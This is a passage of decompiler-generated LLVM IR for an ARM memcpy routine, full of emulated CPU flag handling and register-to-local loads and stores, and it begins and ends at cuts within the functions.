  uselistorder i32* %r1.global-to-local, { 0, 1, 4, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i8** @global_var_2c5e4.990, { 2, 1, 0 }
  uselistorder i32** @global_var_2c5ac.1025, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17330, { 5, 1, 3, 4, 2, 0 }
  uselistorder label %dec_label_pc_1732c, { 0, 2, 1 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_172c0, { 1, 0 }
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17340 = load i32, i32* @r1, align 4
  %v1_17340 = load i32, i32* %r0.global-to-local, align 4
  %v2_17340 = sub i32 %v0_17340, %v1_17340
  %v3_17340 = icmp ult i32 %v0_17340, %v1_17340
  %v4_17340 = xor i32 %v1_17340, %v0_17340
  %v5_17340 = xor i32 %v2_17340, %v0_17340
  %v6_17340 = and i32 %v5_17340, %v4_17340
  %v7_17340 = icmp slt i32 %v6_17340, 0
  store i1 %v7_17340, i1* %cpsr_v.global-to-local, align 1
  %v8_17340 = icmp slt i32 %v2_17340, 0
  store i1 %v8_17340, i1* %cpsr_n.global-to-local, align 1
  %v9_17340 = icmp eq i32 %v0_17340, %v1_17340
  store i1 %v9_17340, i1* @cpsr_z, align 1
  br i1 %v3_17340, label %dec_label_pc_1758c, label %dec_label_pc_17348

dec_label_pc_17348:                               ; preds = %entry
  br i1 %v9_17340, label %.thread123, label %bb

.thread123:                                       ; preds = %bb146, %.thread122, %bb143, %dec_label_pc_17348
  %merge = phi i32 [ %v0_17340, %dec_label_pc_17348 ], [ %v2_17620, %bb143 ], [ %v11_1763c, %bb146 ], [ %v7_1763c, %.thread122 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_17348
  %v5_1734c = inttoptr i32 %v1_17340 to i8*
  store i8* %v5_1734c, i8** %stack_var_-8, align 4
  %v0_17350 = load i32, i32* @r2, align 4
  %v2_17350 = add i32 %v0_17350, -4
  store i32 %v2_17350, i32* %r2.global-to-local, align 4
  %v4_17350 = sub i32 3, %v0_17350
  %v5_17350 = and i32 %v4_17350, %v0_17350
  %v6_17350 = icmp slt i32 %v5_17350, 0
  store i1 %v6_17350, i1* %cpsr_v.global-to-local, align 1
  %v7_17350 = icmp slt i32 %v2_17350, 0
  store i1 %v7_17350, i1* %cpsr_n.global-to-local, align 1
  %v5_17354 = icmp slt i32 %v0_17350, 4
  br i1 %v5_17354, label %bb133, label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %bb
  %v1_17358 = urem i32 %v1_17340, 4
  store i32 %v1_17358, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17358 = icmp eq i32 %v1_17358, 0
  br i1 %v2_17358, label %dec_label_pc_17360, label %dec_label_pc_17404

dec_label_pc_17360:                               ; preds = %dec_label_pc_17358
  %v1_17360 = urem i32 %v0_17340, 4
  store i32 %v1_17360, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17360 = icmp eq i32 %v1_17360, 0
  %extract.t = trunc i32 %v0_17340 to i2
  br i1 %v2_17360, label %dec_label_pc_17368, label %dec_label_pc_17434

dec_label_pc_17368:                               ; preds = %dec_label_pc_17360, %dec_label_pc_1742c
  %v0_1738093 = phi i32 [ %v1_17340, %dec_label_pc_17360 ], [ %v0_1747c76, %dec_label_pc_1742c ]
  %v0_1737c92 = phi i32 [ %v0_17340, %dec_label_pc_17360 ], [ %v0_1742c, %dec_label_pc_1742c ]
  %v0_17368 = phi i32 [ %v2_17350, %dec_label_pc_17360 ], [ %v2_17424, %dec_label_pc_1742c ]
  %v2_17368 = add i32 %v0_17368, -8
  store i32 %v2_17368, i32* %r2.global-to-local, align 4
  %v4_17368 = sub i32 7, %v0_17368
  %v5_17368 = and i32 %v4_17368, %v0_17368
  %v6_17368 = icmp slt i32 %v5_17368, 0
  store i1 %v6_17368, i1* %cpsr_v.global-to-local, align 1
  %v7_17368 = icmp slt i32 %v2_17368, 0
  store i1 %v7_17368, i1* %cpsr_n.global-to-local, align 1
  %v5_1736c = icmp slt i32 %v0_17368, 8
  br i1 %v5_1736c, label %dec_label_pc_173bc, label %dec_label_pc_17370

dec_label_pc_17370:                               ; preds = %dec_label_pc_17368
  %v2_17370 = add i32 %v0_17368, -28
  store i32 %v2_17370, i32* %r2.global-to-local, align 4
  %v4_17370 = sub i32 27, %v0_17368
  %v5_17370 = and i32 %v4_17370, %v2_17368
  %v6_17370 = icmp slt i32 %v5_17370, 0
  store i1 %v6_17370, i1* %cpsr_v.global-to-local, align 1
  %v7_17370 = icmp slt i32 %v2_17370, 0
  store i1 %v7_17370, i1* %cpsr_n.global-to-local, align 1
  %v5_17374 = icmp slt i32 %v2_17368, 20
  br i1 %v5_17374, label %dec_label_pc_173a8, label %dec_label_pc_17378

dec_label_pc_17378:                               ; preds = %dec_label_pc_17370
  %v0_17378 = load i32, i32* @r4, align 4
  store i32 %v0_17378, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1737c

dec_label_pc_1737c:                               ; preds = %dec_label_pc_1737c.dec_label_pc_1737c_crit_edge, %dec_label_pc_17378
  %v0_17380 = phi i32 [ %v12_17388, %dec_label_pc_1737c.dec_label_pc_1737c_crit_edge ], [ %v0_1738093, %dec_label_pc_17378 ]
  %v0_1737c = phi i32 [ %v0_1737c.pre, %dec_label_pc_1737c.dec_label_pc_1737c_crit_edge ], [ %v0_1737c92, %dec_label_pc_17378 ]
  %v1_1737c = inttoptr i32 %v0_1737c to i32*
  %v2_1737c = load i32, i32* %v1_1737c, align 4
  store i32 %v2_1737c, i32* %r3.global-to-local, align 4
  %v3_1737c = add i32 %v0_1737c, 4
  %v4_1737c = inttoptr i32 %v3_1737c to i32*
  %v5_1737c = load i32, i32* %v4_1737c, align 4
  store i32 %v5_1737c, i32* %r4.global-to-local, align 4
  %v6_1737c = add i32 %v0_1737c, 8
  %v7_1737c = inttoptr i32 %v6_1737c to i32*
  %v8_1737c = load i32, i32* %v7_1737c, align 4
  store i32 %v8_1737c, i32* %ip.global-to-local, align 4
  %v9_1737c = add i32 %v0_1737c, 12
  %v10_1737c = inttoptr i32 %v9_1737c to i32*
  %v11_1737c = load i32, i32* %v10_1737c, align 4
  store i32 %v11_1737c, i32* %lr.global-to-local, align 4
  %v12_1737c = add i32 %v0_1737c, 16
  store i32 %v12_1737c, i32* %r1.global-to-local, align 4
  %v1_17380 = inttoptr i32 %v0_17380 to i32*
  store i32 %v2_1737c, i32* %v1_17380, align 4
  %v3_17380 = add i32 %v0_17380, 4
  %v4_17380 = inttoptr i32 %v3_17380 to i32*
  %v5_17380 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17380, i32* %v4_17380, align 4
  %v6_17380 = add i32 %v0_17380, 8
  %v7_17380 = inttoptr i32 %v6_17380 to i32*
  %v8_17380 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_17380, i32* %v7_17380, align 4
  %v9_17380 = add i32 %v0_17380, 12
  %v10_17380 = inttoptr i32 %v9_17380 to i32*
  %v11_17380 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_17380, i32* %v10_17380, align 4
  %v12_17380 = add i32 %v0_17380, 16
  store i32 %v12_17380, i32* %r0.global-to-local, align 4
  %v0_17384 = load i32, i32* %r1.global-to-local, align 4
  %v1_17384 = inttoptr i32 %v0_17384 to i32*
  %v2_17384 = load i32, i32* %v1_17384, align 4
  store i32 %v2_17384, i32* %r3.global-to-local, align 4
  %v3_17384 = add i32 %v0_17384, 4
  %v4_17384 = inttoptr i32 %v3_17384 to i32*
  %v5_17384 = load i32, i32* %v4_17384, align 4
  store i32 %v5_17384, i32* %r4.global-to-local, align 4
  %v6_17384 = add i32 %v0_17384, 8
  %v7_17384 = inttoptr i32 %v6_17384 to i32*
  %v8_17384 = load i32, i32* %v7_17384, align 4
  store i32 %v8_17384, i32* @ip, align 4
  %v9_17384 = add i32 %v0_17384, 12
  %v10_17384 = inttoptr i32 %v9_17384 to i32*
  %v11_17384 = load i32, i32* %v10_17384, align 4
  store i32 %v11_17384, i32* @lr, align 4
  %v12_17384 = add i32 %v0_17384, 16
  store i32 %v12_17384, i32* @r1, align 4
  %v1_17388 = inttoptr i32 %v12_17380 to i32*
  store i32 %v2_17384, i32* %v1_17388, align 4
  %v3_17388 = add i32 %v0_17380, 20
  %v4_17388 = inttoptr i32 %v3_17388 to i32*
  %v5_17388 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17388, i32* %v4_17388, align 4
  %v6_17388 = add i32 %v0_17380, 24
  %v7_17388 = inttoptr i32 %v6_17388 to i32*
  %v8_17388 = load i32, i32* @ip, align 4
  store i32 %v8_17388, i32* %v7_17388, align 4
  %v9_17388 = add i32 %v0_17380, 28
  %v10_17388 = inttoptr i32 %v9_17388 to i32*
  %v11_17388 = load i32, i32* @lr, align 4
  store i32 %v11_17388, i32* %v10_17388, align 4
  %v12_17388 = add i32 %v0_17380, 32
  store i32 %v12_17388, i32* %r0.global-to-local, align 4
  %v0_1738c = load i32, i32* %r2.global-to-local, align 4
  %v2_1738c = add i32 %v0_1738c, -32
  store i32 %v2_1738c, i32* %r2.global-to-local, align 4
  %v6_17390 = icmp slt i32 %v0_1738c, 32
  br i1 %v6_17390, label %dec_label_pc_17394, label %dec_label_pc_1737c.dec_label_pc_1737c_crit_edge

dec_label_pc_1737c.dec_label_pc_1737c_crit_edge:  ; preds = %dec_label_pc_1737c
  %v0_1737c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_1737c

dec_label_pc_17394:                               ; preds = %dec_label_pc_1737c
  %v4_17394 = add i32 %v0_1738c, -16
  %v6_17394 = add i32 %v0_1738c, 2147483616
  %v7_17394 = and i32 %v4_17394, %v6_17394
  %v8_17394 = icmp slt i32 %v7_17394, 0
  store i1 %v8_17394, i1* %cpsr_v.global-to-local, align 1
  %v9_17394 = icmp slt i32 %v4_17394, 0
  store i1 %v9_17394, i1* %cpsr_n.global-to-local, align 1
  %v5_17398 = icmp slt i32 %v2_1738c, -16
  br i1 %v5_17398, label %.thread2, label %bb130

bb130:                                            ; preds = %dec_label_pc_17394
  %v6_17398 = load i32, i32* @r1, align 4
  %v7_17398 = inttoptr i32 %v6_17398 to i32*
  %v8_17398 = load i32, i32* %v7_17398, align 4
  store i32 %v8_17398, i32* %r3.global-to-local, align 4
  %v9_17398 = add i32 %v6_17398, 4
  %v10_17398 = inttoptr i32 %v9_17398 to i32*
  %v11_17398 = load i32, i32* %v10_17398, align 4
  store i32 %v11_17398, i32* %r4.global-to-local, align 4
  %v12_17398 = add i32 %v6_17398, 8
  %v13_17398 = inttoptr i32 %v12_17398 to i32*
  %v14_17398 = load i32, i32* %v13_17398, align 4
  store i32 %v14_17398, i32* @ip, align 4
  %v15_17398 = add i32 %v6_17398, 12
  %v16_17398 = inttoptr i32 %v15_17398 to i32*
  %v17_17398 = load i32, i32* %v16_17398, align 4
  store i32 %v17_17398, i32* @lr, align 4
  %v18_17398 = add i32 %v6_17398, 16
  store i32 %v18_17398, i32* @r1, align 4
  %v7_1739c = inttoptr i32 %v12_17388 to i32*
  store i32 %v8_17398, i32* %v7_1739c, align 4
  %v9_1739c = add i32 %v0_17380, 36
  %v10_1739c = inttoptr i32 %v9_1739c to i32*
  %v11_1739c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_1739c, i32* %v10_1739c, align 4
  %v12_1739c = add i32 %v0_17380, 40
  %v13_1739c = inttoptr i32 %v12_1739c to i32*
  %v14_1739c = load i32, i32* @ip, align 4
  store i32 %v14_1739c, i32* %v13_1739c, align 4
  %v15_1739c = add i32 %v0_17380, 44
  %v16_1739c = inttoptr i32 %v15_1739c to i32*
  %v17_1739c = load i32, i32* @lr, align 4
  store i32 %v17_1739c, i32* %v16_1739c, align 4
  %v18_1739c = add i32 %v0_17380, 48
  store i32 %v18_1739c, i32* %r0.global-to-local, align 4
  %v6_173a0 = load i32, i32* %r2.global-to-local, align 4
  %v7_173a0 = add i32 %v6_173a0, -16
  store i32 %v7_173a0, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17394, %bb130
  %v3_173b0102 = phi i32 [ %v12_17388, %dec_label_pc_17394 ], [ %v18_1739c, %bb130 ]
  %v0_173a896 = phi i32 [ %v2_1738c, %dec_label_pc_17394 ], [ %v7_173a0, %bb130 ]
  %v2_173a4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_173a4, i32* @r4, align 4
  br label %dec_label_pc_173a8

dec_label_pc_173a8:                               ; preds = %dec_label_pc_17370, %.thread2
  %v3_173b0101 = phi i32 [ %v0_1738093, %dec_label_pc_17370 ], [ %v3_173b0102, %.thread2 ]
  %v0_173a8 = phi i32 [ %v2_17370, %dec_label_pc_17370 ], [ %v0_173a896, %.thread2 ]
  %v1_173a8 = add i32 %v0_173a8, 20
  store i32 %v1_173a8, i32* %r2.global-to-local, align 4
  %v3_173a8 = sub i32 0, %v0_173a8
  %v4_173a8 = and i32 %v1_173a8, %v3_173a8
  %v5_173a8 = icmp slt i32 %v4_173a8, 0
  store i1 %v5_173a8, i1* %cpsr_v.global-to-local, align 1
  %v6_173a8 = icmp slt i32 %v1_173a8, 0
  store i1 %v6_173a8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_173ac

dec_label_pc_173ac:                               ; preds = %.thread118, %dec_label_pc_173a8
  %v0_173bc.pre149 = phi i32 [ %v0_173bc.pre, %.thread118 ], [ %v1_173a8, %dec_label_pc_173a8 ]
  %v3_173b0 = phi i32 [ %v3_173b099119, %.thread118 ], [ %v3_173b0101, %dec_label_pc_173a8 ]
  %v1_173b4 = phi i1 [ %v1_173b8, %.thread118 ], [ %v5_173a8, %dec_label_pc_173a8 ]
  %v0_173b4 = phi i1 [ %v0_173b8, %.thread118 ], [ %v6_173a8, %dec_label_pc_173a8 ]
  %v2_173ac = xor i1 %v1_173b4, %v0_173b4
  br i1 %v2_173ac, label %.thread118, label %bb131

bb131:                                            ; preds = %dec_label_pc_173ac
  %v3_173ac = load i32, i32* @r1, align 4
  %v4_173ac = inttoptr i32 %v3_173ac to i32*
  %v5_173ac = load i32, i32* %v4_173ac, align 4
  store i32 %v5_173ac, i32* %r3.global-to-local, align 4
  %v6_173ac = add i32 %v3_173ac, 4
  %v7_173ac = inttoptr i32 %v6_173ac to i32*
  %v8_173ac = load i32, i32* %v7_173ac, align 4
  store i32 %v8_173ac, i32* @ip, align 4
  %v9_173ac = add i32 %v3_173ac, 8
  %v10_173ac = inttoptr i32 %v9_173ac to i32*
  %v11_173ac = load i32, i32* %v10_173ac, align 4
  store i32 %v11_173ac, i32* @lr, align 4
  %v12_173ac = add i32 %v3_173ac, 12
  store i32 %v12_173ac, i32* @r1, align 4
  %v4_173b0 = inttoptr i32 %v3_173b0 to i32*
  store i32 %v5_173ac, i32* %v4_173b0, align 4
  %v6_173b0 = add i32 %v3_173b0, 4
  %v7_173b0 = inttoptr i32 %v6_173b0 to i32*
  %v8_173b0 = load i32, i32* @ip, align 4
  store i32 %v8_173b0, i32* %v7_173b0, align 4
  %v9_173b0 = add i32 %v3_173b0, 8
  %v10_173b0 = inttoptr i32 %v9_173b0 to i32*
  %v11_173b0 = load i32, i32* @lr, align 4
  store i32 %v11_173b0, i32* %v10_173b0, align 4
  %v12_173b0 = add i32 %v3_173b0, 12
  store i32 %v12_173b0, i32* %r0.global-to-local, align 4
  %v3_173b4 = load i32, i32* %r2.global-to-local, align 4
  %v4_173b4 = add i32 %v3_173b4, -12
  store i32 %v4_173b4, i32* %r2.global-to-local, align 4
  %v6_173b4 = sub i32 11, %v3_173b4
  %v7_173b4 = and i32 %v6_173b4, %v3_173b4
  %v8_173b4 = icmp slt i32 %v7_173b4, 0
  store i1 %v8_173b4, i1* %cpsr_v.global-to-local, align 1
  %v9_173b4 = icmp slt i32 %v4_173b4, 0
  store i1 %v9_173b4, i1* %cpsr_n.global-to-local, align 1
  br label %.thread118

.thread118:                                       ; preds = %dec_label_pc_173ac, %bb131
  %v0_173bc.pre = phi i32 [ %v4_173b4, %bb131 ], [ %v0_173bc.pre149, %dec_label_pc_173ac ]
  %v3_173b099119 = phi i32 [ %v12_173b0, %bb131 ], [ %v3_173b0, %dec_label_pc_173ac ]
  %v1_173b8 = phi i1 [ %v8_173b4, %bb131 ], [ %v1_173b4, %dec_label_pc_173ac ]
  %v0_173b8 = phi i1 [ %v9_173b4, %bb131 ], [ %v0_173b4, %dec_label_pc_173ac ]
  %v2_173b8 = xor i1 %v1_173b8, %v0_173b8
  br i1 %v2_173b8, label %dec_label_pc_173bc, label %dec_label_pc_173ac

dec_label_pc_173bc:                               ; preds = %.thread118, %dec_label_pc_17368
  %v7_173cc = phi i32 [ %v0_1738093, %dec_label_pc_17368 ], [ %v3_173b099119, %.thread118 ]
  %v0_173bc = phi i32 [ %v2_17368, %dec_label_pc_17368 ], [ %v0_173bc.pre, %.thread118 ]
  %v2_173bc = add i32 %v0_173bc, 8
  store i32 %v2_173bc, i32* %r2.global-to-local, align 4
  %v4_173bc = sub i32 0, %v0_173bc
  %v5_173bc = and i32 %v2_173bc, %v4_173bc
  %v6_173bc = icmp slt i32 %v5_173bc, 0
  store i1 %v6_173bc, i1* %cpsr_v.global-to-local, align 1
  %v7_173bc = icmp slt i32 %v2_173bc, 0
  store i1 %v7_173bc, i1* %cpsr_n.global-to-local, align 1
  %v5_173c0 = icmp slt i32 %v0_173bc, -8
  br i1 %v5_173c0, label %bb133, label %dec_label_pc_173c4

dec_label_pc_173c4:                               ; preds = %dec_label_pc_173bc
  %v6_173c4 = add i32 %v0_173bc, 4
  store i32 %v6_173c4, i32* %r2.global-to-local, align 4
  %v8_173c4 = sub i32 -5, %v0_173bc
  %v9_173c4 = and i32 %v8_173c4, %v2_173bc
  %v10_173c4 = icmp slt i32 %v9_173c4, 0
  store i1 %v10_173c4, i1* %cpsr_v.global-to-local, align 1
  %v11_173c4 = icmp slt i32 %v6_173c4, 0
  store i1 %v11_173c4, i1* %cpsr_n.global-to-local, align 1
  %v5_173c8 = icmp slt i32 %v2_173bc, 4
  %v6_173c8 = load i32, i32* @r1, align 4
  %v7_173c8 = inttoptr i32 %v6_173c8 to i32*
  %v8_173c8 = load i32, i32* %v7_173c8, align 4
  store i32 %v8_173c8, i32* %r3.global-to-local, align 4
  %v10_173c8 = add i32 %v6_173c8, 4
  br i1 %v5_173c8, label %.thread6, label %bb132

.thread6:                                         ; preds = %dec_label_pc_173c4
  store i32 %v10_173c8, i32* @r1, align 4
  %v8_173cc = inttoptr i32 %v7_173cc to i32*
  store i32 %v8_173c8, i32* %v8_173cc, align 4
  %v9_173cc = load i32, i32* %r0.global-to-local, align 4
  %v10_173cc = add i32 %v9_173cc, 4
  store i32 %v10_173cc, i32* %r0.global-to-local, align 4
  %v0_173dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb133

bb132:                                            ; preds = %dec_label_pc_173c4
  %v10_173d0 = inttoptr i32 %v10_173c8 to i32*
  %v11_173d0 = load i32, i32* %v10_173d0, align 4
  store i32 %v11_173d0, i32* @ip, align 4
  %v12_173d0 = add i32 %v6_173c8, 8
  store i32 %v12_173d0, i32* @r1, align 4
  %v7_173d4 = inttoptr i32 %v7_173cc to i32*
  store i32 %v8_173c8, i32* %v7_173d4, align 4
  %v9_173d4 = add i32 %v7_173cc, 4
  %v10_173d4 = inttoptr i32 %v9_173d4 to i32*
  %v11_173d4 = load i32, i32* @ip, align 4
  store i32 %v11_173d4, i32* %v10_173d4, align 4
  %v12_173d4 = add i32 %v7_173cc, 8
  store i32 %v12_173d4, i32* %r0.global-to-local, align 4
  %v6_173d8 = load i32, i32* %r2.global-to-local, align 4
  %v7_173d8 = add i32 %v6_173d8, -4
  store i32 %v7_173d8, i32* %r2.global-to-local, align 4
  br label %bb133

bb133:                                            ; preds = %.thread6, %.thread12, %dec_label_pc_173bc, %bb, %dec_label_pc_17584, %dec_label_pc_174ac, %dec_label_pc_17518, %bb132
  %v2_173ec = phi i32 [ %v10_173cc, %.thread6 ], [ %v0_1747c76, %.thread12 ], [ %v7_173cc, %dec_label_pc_173bc ], [ %v1_17340, %bb ], [ %v2_173ec114, %dec_label_pc_17584 ], [ %v2_173ec113, %dec_label_pc_174ac ], [ %v2_173ec112, %dec_label_pc_17518 ], [ %v12_173d4, %bb132 ]
  %v0_173dc = phi i32 [ %v0_173dc.pre, %.thread6 ], [ %v2_17424, %.thread12 ], [ %v2_173bc, %dec_label_pc_173bc ], [ %v2_17350, %bb ], [ %v0_173dc110, %dec_label_pc_17584 ], [ %v0_173dc109, %dec_label_pc_174ac ], [ %v0_173dc108, %dec_label_pc_17518 ], [ %v7_173d8, %bb132 ]
  %v1_173dc = add i32 %v0_173dc, 4
  store i32 %v1_173dc, i32* @r2, align 4
  %v3_173dc = sub i32 0, %v0_173dc
  %v4_173dc = and i32 %v1_173dc, %v3_173dc
  %v5_173dc = icmp slt i32 %v4_173dc, 0
  store i1 %v5_173dc, i1* %cpsr_v.global-to-local, align 1
  %v6_173dc = icmp slt i32 %v1_173dc, 0
  store i1 %v6_173dc, i1* %cpsr_n.global-to-local, align 1
  %v7_173dc = icmp eq i32 %v1_173dc, 0
  store i1 %v7_173dc, i1* @cpsr_z, align 1
  br i1 %v7_173dc, label %bb134, label %bb135

bb134:                                            ; preds = %bb133
  %v3_173e0 = load i8*, i8** %stack_var_-8, align 4
  %v4_173e0 = ptrtoint i8* %v3_173e0 to i32
  store i32 %v4_173e0, i32* %r0.global-to-local, align 4
  ret i32 %v4_173e0

bb135:                                            ; preds = %bb133
  %v1_173e4 = add i32 %v0_173dc, 2
  %v3_173e4 = sub i32 -3, %v0_173dc
  %v4_173e4 = and i32 %v3_173e4, %v1_173dc
  %v5_173e4 = icmp slt i32 %v4_173e4, 0
  store i1 %v5_173e4, i1* %cpsr_v.global-to-local, align 1
  %v6_173e4 = icmp slt i32 %v1_173e4, 0
  store i1 %v6_173e4, i1* %cpsr_n.global-to-local, align 1
  %v7_173e4 = icmp eq i32 %v1_173dc, 2
  store i1 %v7_173e4, i1* @cpsr_z, align 1
  %v0_173e8 = load i32, i32* @r1, align 4
  %v1_173e8 = inttoptr i32 %v0_173e8 to i8*
  %v2_173e8 = load i8, i8* %v1_173e8, align 1
  %v3_173e8 = zext i8 %v2_173e8 to i32
  store i32 %v3_173e8, i32* %r3.global-to-local, align 4
  %v5_173e8 = add i32 %v0_173e8, 1
  store i32 %v5_173e8, i32* @r1, align 4
  %v3_173ec = inttoptr i32 %v2_173ec to i8*
  store i8 %v2_173e8, i8* %v3_173ec, align 1
  %v4_173ec = load i32, i32* %r0.global-to-local, align 4
  %v5_173ec = add i32 %v4_173ec, 1
  store i32 %v5_173ec, i32* %r0.global-to-local, align 4
  %v0_173f0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_173f0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_173f0 = xor i1 %v0_173f0, %v1_173f0
  br i1 %v2_173f0, label %.thread120, label %bb136

bb136:                                            ; preds = %bb135
  %v3_173f0 = load i32, i32* @r1, align 4
  %v4_173f0 = inttoptr i32 %v3_173f0 to i8*
  %v5_173f0 = load i8, i8* %v4_173f0, align 1
  %v6_173f0 = zext i8 %v5_173f0 to i32
  store i32 %v6_173f0, i32* %r3.global-to-local, align 4
  %v8_173f0 = add i32 %v3_173f0, 1
  store i32 %v8_173f0, i32* @r1, align 4
  %v6_173f4 = inttoptr i32 %v5_173ec to i8*
  store i8 %v5_173f0, i8* %v6_173f4, align 1
  %v7_173f4 = load i32, i32* %r0.global-to-local, align 4
  %v8_173f4 = add i32 %v7_173f4, 1
  store i32 %v8_173f4, i32* %r0.global-to-local, align 4
  %v1_173f8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_173f8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread120

.thread120:                                       ; preds = %bb135, %bb136
  %v7_173fc = phi i32 [ %v8_173f4, %bb136 ], [ %v5_173ec, %bb135 ]
  %v2_173fc = phi i1 [ %v2_173f8.pre, %bb136 ], [ %v1_173f0, %bb135 ]
  %v1_173fc = phi i1 [ %v1_173f8.pre, %bb136 ], [ %v0_173f0, %bb135 ]
  %v0_173f8 = load i1, i1* @cpsr_z, align 1
  %v3_173f8 = xor i1 %v2_173fc, %v1_173fc
  %v4_173f8 = or i1 %v0_173f8, %v3_173f8
  br i1 %v4_173f8, label %.thread121, label %bb137

bb137:                                            ; preds = %.thread120
  %v5_173f8 = load i32, i32* @r1, align 4
  %v6_173f8 = inttoptr i32 %v5_173f8 to i8*
  %v7_173f8 = load i8, i8* %v6_173f8, align 1
  %v8_173f8 = zext i8 %v7_173f8 to i32
  store i32 %v8_173f8, i32* %r3.global-to-local, align 4
  %v10_173f8 = add i32 %v5_173f8, 1
  store i32 %v10_173f8, i32* @r1, align 4
  %v8_173fc = inttoptr i32 %v7_173fc to i8*
  store i8 %v7_173f8, i8* %v8_173fc, align 1
  %v9_173fc = load i32, i32* %r0.global-to-local, align 4
  %v10_173fc = add i32 %v9_173fc, 1
  store i32 %v10_173fc, i32* %r0.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %.thread120, %bb137
  %v2_17400 = load i8*, i8** %stack_var_-8, align 4
  %v3_17400 = ptrtoint i8* %v2_17400 to i32
  store i32 %v3_17400, i32* %r0.global-to-local, align 4
  ret i32 %v3_17400

dec_label_pc_17404:                               ; preds = %dec_label_pc_17358
  %v1_17404 = sub nsw i32 4, %v1_17358
  store i32 %v1_17404, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_17408 = icmp ult i32 %v1_17404, 2
  store i1 %v8_17408, i1* %cpsr_n.global-to-local, align 1
  %v1_1740c = inttoptr i32 %v0_17340 to i8*
  %v2_1740c = load i8, i8* %v1_1740c, align 1
  %v3_1740c = zext i8 %v2_1740c to i32
  store i32 %v3_1740c, i32* %r3.global-to-local, align 4
  %v5_1740c = add i32 %v0_17340, 1
  store i32 %v5_1740c, i32* @r1, align 4
  store i8 %v2_1740c, i8* %v5_1734c, align 1
  %v4_17410 = load i32, i32* %r0.global-to-local, align 4
  %v5_17410 = add i32 %v4_17410, 1
  store i32 %v5_17410, i32* %r0.global-to-local, align 4
  br i1 %v8_17408, label %.thread12, label %bb138

bb138:                                            ; preds = %dec_label_pc_17404
  %v9_17408 = icmp eq i32 %v1_17404, 2
  %v6_17414 = load i32, i32* @r1, align 4
  %v7_17414 = inttoptr i32 %v6_17414 to i8*
  %v8_17414 = load i8, i8* %v7_17414, align 1
  %v9_17414 = zext i8 %v8_17414 to i32
  store i32 %v9_17414, i32* %r3.global-to-local, align 4
  %v11_17414 = add i32 %v6_17414, 1
  store i32 %v11_17414, i32* @r1, align 4
  %v9_17418 = inttoptr i32 %v5_17410 to i8*
  store i8 %v8_17414, i8* %v9_17418, align 1
  %v10_17418 = load i32, i32* %r0.global-to-local, align 4
  %v11_17418 = add i32 %v10_17418, 1
  store i32 %v11_17418, i32* %r0.global-to-local, align 4
  br i1 %v9_17408, label %.thread12, label %bb139

bb139:                                            ; preds = %bb138
  %v8_1741c = load i32, i32* @r1, align 4
  %v9_1741c = inttoptr i32 %v8_1741c to i8*
  %v10_1741c = load i8, i8* %v9_1741c, align 1
  %v11_1741c = zext i8 %v10_1741c to i32
  store i32 %v11_1741c, i32* %r3.global-to-local, align 4
  %v13_1741c = add i32 %v8_1741c, 1
  store i32 %v13_1741c, i32* @r1, align 4
  %v11_17420 = inttoptr i32 %v11_17418 to i8*
  store i8 %v10_1741c, i8* %v11_17420, align 1
  %v12_17420 = load i32, i32* %r0.global-to-local, align 4
  %v13_17420 = add i32 %v12_17420, 1
  store i32 %v13_17420, i32* %r0.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb138, %dec_label_pc_17404, %bb139
  %v0_1747c76 = phi i32 [ %v11_17418, %bb138 ], [ %v5_17410, %dec_label_pc_17404 ], [ %v13_17420, %bb139 ]
  %v0_17424 = load i32, i32* %r2.global-to-local, align 4
  %v1_17424 = load i32, i32* @ip, align 4
  %v2_17424 = sub i32 %v0_17424, %v1_17424
  store i32 %v2_17424, i32* %r2.global-to-local, align 4
  %v4_17424 = xor i32 %v1_17424, %v0_17424
  %v5_17424 = xor i32 %v2_17424, %v0_17424
  %v6_17424 = and i32 %v5_17424, %v4_17424
  %v7_17424 = icmp slt i32 %v6_17424, 0
  store i1 %v7_17424, i1* %cpsr_v.global-to-local, align 1
  %v8_17424 = icmp slt i32 %v2_17424, 0
  store i1 %v8_17424, i1* %cpsr_n.global-to-local, align 1
  %v5_17428 = icmp slt i32 %v0_17424, %v1_17424
  br i1 %v5_17428, label %bb133, label %dec_label_pc_1742c

